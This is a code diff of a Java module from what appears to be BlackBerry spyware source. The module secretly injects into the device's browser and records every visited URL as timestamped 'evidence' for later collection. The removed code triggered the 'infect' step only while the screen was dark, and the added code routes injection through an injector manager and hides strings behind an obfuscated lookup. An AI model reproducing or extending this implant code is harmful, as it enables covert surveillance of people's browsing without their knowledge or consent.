@@ -12,17 +12,16 @@ package blackberry.module;
 import java.util.Date;
 import java.util.Vector;
 
-import net.rim.device.api.system.Backlight;
-import blackberry.AppListener;
-import blackberry.Device;
+import net.rim.device.api.ui.UiApplication;
+import blackberry.Messages;
+import blackberry.Status;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
-import blackberry.injection.AppInjector;
-import blackberry.interfaces.ApplicationObserver;
-import blackberry.interfaces.BacklightObserver;
+import blackberry.injection.InjectorManager;
+import blackberry.injection.injectors.group.UrlGroupInjector;
 import blackberry.manager.ModuleManager;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
@@ -31,23 +30,20 @@ import blackberry.utils.WChar;
 /**
  * The Class UrlAgent.
  */
-public final class ModuleUrl extends BaseModule implements ApplicationObserver,
-        BacklightObserver {
+public final class ModuleUrl extends BaseModule {
     //#ifdef DEBUG
     static Debug debug = new Debug("ModUrl", DebugLevel.VERBOSE);
     //#endif
 
-    String appName = "Browser";
-
-    AppInjector appInjector;
-
-    private boolean seen = true;
+    //private boolean seen = true;
     private boolean unsupported = false;
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
 
+    private static final int BROWSER_TYPE = 7;
+
     public static String getStaticType() {
-        return "url";
+        return Messages.getString("1f.0");//"url";
     }
 
     public static ModuleUrl getInstance() {
@@ -55,16 +51,9 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
     }
 
     protected boolean parse(ConfModule conf) {
-        if (Device.getInstance().atLeast(6, 0)) {
-            seen = false;
-        }
-        
-        if (Device.getInstance().atLeast(7, 0)) {
-            unsupported = true;
-        }
-        
-        setPeriod(APP_TIMER_PERIOD);
-        setDelay(APP_TIMER_PERIOD);
+
+        setPeriod(NEVER);
+        setDelay(SOON);
         return true;
     }
 
@@ -77,28 +66,14 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
             return;
         }
 
-        AppListener.getInstance().addApplicationObserver(this);
-        AppListener.getInstance().addBacklightObserver(this);
+        UrlGroupInjector.enableGroup(true);
+        UiApplication.getUiApplication().invokeAndWait(new Runnable() {
 
-        try {
-            appInjector = new AppInjector(AppInjector.APP_BROWSER);
-
-        } catch (Exception ex) {
-            //#ifdef DEBUG
-            debug.error("actualStart: " + ex);
-            //#endif
-        }
-
-        if (!Backlight.isEnabled() && !appInjector.isInfected() && seen) {
-            //#ifdef DEBUG
-            debug.info("injecting");
-            //#endif
-
-            appInjector.infect();
-            if (Device.getInstance().atLeast(6, 0)) {
-                seen = false;
+            public void run() {
+                InjectorManager.getInstance().start();
             }
-        }
+        });
+
     }
 
     public synchronized void actualStop() {
@@ -106,8 +81,8 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         debug.trace("actualStop");
         //#endif
 
-        AppListener.getInstance().removeApplicationObserver(this);
-        AppListener.getInstance().removeBacklightObserver(this);
+        UrlGroupInjector.enableGroup(false);
+        InjectorManager.getInstance().stop();
     }
 
     boolean infecting = false;
@@ -121,52 +96,6 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
             return;
         }
 
-        if (appInjector.isInfected() && Backlight.isEnabled()
-                && isAppForeground) {
-            //#ifdef DEBUG
-            debug.info("actualRun, infected, enabled, foreground");
-            //#endif
-
-            appInjector.callMenuInContext();
-        } else {
-            //#ifdef DEBUG
-            debug.trace("actualRun: infected=" + appInjector.isInfected()
-                    + " backlight=" + Backlight.isEnabled() + " foreground="
-                    + isAppForeground);
-            //#endif
-        }
-    }
-
-    boolean isAppForeground;
-
-    public void onApplicationChange(String startedName, String stoppedName,
-            String startedMod, String stoppedMod) {
-        if (startedName != null && startedName.indexOf(appName) >= 0) {
-            //#ifdef DEBUG
-            debug.trace("onApplicationChange: foreground");
-            //#endif
-            isAppForeground = true;
-            seen = true;
-        } else {
-            //#ifdef DEBUG
-            debug.trace("onApplicationChange: not foreground");
-            //#endif
-            isAppForeground = false;
-        }
-    }
-
-    public void onBacklightChange(boolean on) {
-        if (!on && !appInjector.isInfected() && seen) {
-            //#ifdef DEBUG
-            debug.info("onBacklightChange, injecting");
-            //#endif
-
-            appInjector.infect();
-
-            if (Device.getInstance().atLeast(6, 0)) {
-                seen = false;
-            }
-        }
     }
 
     public synchronized void saveUrl(String url) {
@@ -178,25 +107,31 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         DateTime datetime = new DateTime(date);
 
         int version = 0x20100713;
+        String title = "";
         final Vector items = new Vector();
 
         items.addElement(datetime.getStructTm());
         items.addElement(Utils.intToByteArray(version));
         items.addElement(WChar.getBytes(url, true));
+        items.addElement(Utils.intToByteArray(BROWSER_TYPE));
+        items.addElement(WChar.getBytes(title, true));
         items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
 
         Evidence evidence = new Evidence(EvidenceType.URL);
         evidence.createEvidence(null);
         evidence.writeEvidences(items);
         evidence.close();
+        
+        if(Status.self().wantLight()){
+            Debug.ledFlash(Debug.COLOR_WHITE);
+            Debug.playSoundOk(1);
+        }
 
     }
 
     //#ifdef DEBUG
     public void disinfect() {
-        if (appInjector != null) {
-            appInjector.disinfect();
-        }
+
     }
     //#endif
 }
